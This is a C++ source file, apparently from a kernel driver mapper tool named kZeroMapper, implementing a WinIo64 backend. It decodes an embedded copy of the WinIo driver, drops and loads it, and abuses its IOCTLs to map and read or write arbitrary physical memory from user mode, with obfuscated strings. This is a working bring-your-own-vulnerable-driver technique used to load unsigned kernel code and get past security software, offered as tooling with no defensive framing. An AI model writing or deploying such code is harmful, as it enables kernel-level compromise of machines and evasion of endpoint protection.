#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_WINIO64)

#include "WinIo64Backend.h"
#include "../Common/vDriverLoader.h"
#include "winio64_sys.h"

namespace
{
	constexpr DWORD WinIoMapPhysToLinIoctl  = 0x80102040;
	constexpr DWORD WinIoUnmapPhysAddrIoctl = 0x80102044;
}

std::string WinIo64Backend::Name( ) const
{
	return pstra( "WinIo64" );
}

NTSTATUS WinIo64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( winio64_sys, sizeof( winio64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\WinIo" ),
		image.data( ), image.size( ), &m_Device, 0x91C0, pstra( "WinIo64" ) );
}

NTSTATUS WinIo64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "WinIo64" ) );
}

ULONG WinIo64Backend::GetLowMemoryChunkSize( ) const
{
	// The WinIo section mapping handles 16MB in a single view.
	return 0x1000000;
}

bool WinIo64Backend::MapPhysical( uint64_t physicalAddress, uint64_t size, uint64_t* virtualAddress )
{
	if ( !virtualAddress || !size )
		return false;

	*virtualAddress = 0;

	WinIoMapRequest request {};
	request.Size = size;
	request.PhysicalAddress = physicalAddress;
	request.Handle = 0;
	request.LinearAddress = 0;
	request.SectionObject = 0;

	if ( !DeviceIoControl( m_Device, WinIoMapPhysToLinIoctl, &request, sizeof( request ), &request, sizeof( request ), nullptr, nullptr ) )
	{
		LOG_SEC( "[-] - [WinIo64] MapPhysical failed pa=0x%llx size=0x%llx gle=%lu", physicalAddress, size, GetLastError( ) );
		return false;
	}

	*virtualAddress = request.LinearAddress;
	return *virtualAddress != 0;
}

bool WinIo64Backend::UnmapPhysical( uint64_t virtualAddress )
{
	if ( !virtualAddress )
		return false;

	WinIoMapRequest request {};
	request.Size = 0;
	request.PhysicalAddress = 0;
	request.Handle = 0;
	request.LinearAddress = virtualAddress;
	request.SectionObject = 0;

	return DeviceIoControl( m_Device, WinIoUnmapPhysAddrIoctl, &request, sizeof( request ), &request, sizeof( request ), nullptr, nullptr ) != FALSE;
}

bool WinIo64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, uint64_t bytes, bool write )
{
	if ( !buffer || !bytes )
		return false;

	const auto pageOffset = physicalAddress & 0xFFF;
	const auto alignedPa = physicalAddress & ~0xFFFull;
	const auto mapSize = ( pageOffset + bytes + 0xFFF ) & ~0xFFFull;

	uint64_t mappedVa = 0;

	if ( !MapPhysical( alignedPa, mapSize, &mappedVa ) )
		return false;

	bool result = false;

	const auto ptr = r_cast<uint8_t*>( mappedVa ) + pageOffset;

	__try
	{
		if ( write )
			memcpy( ptr, buffer, s_cast<size_t>( bytes ) );
		else
			memcpy( buffer, ptr, s_cast<size_t>( bytes ) );

		result = true;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		LOG_SEC( "[-] - [WinIo64] ReadWritePhysical exception pa=0x%llx size=0x%llx write=%d", physicalAddress, bytes, write ? 1 : 0 );
	}

	UnmapPhysical( mappedVa );
	return result;
}




#endif // KZEROMAPPER_ENABLE_WINIO64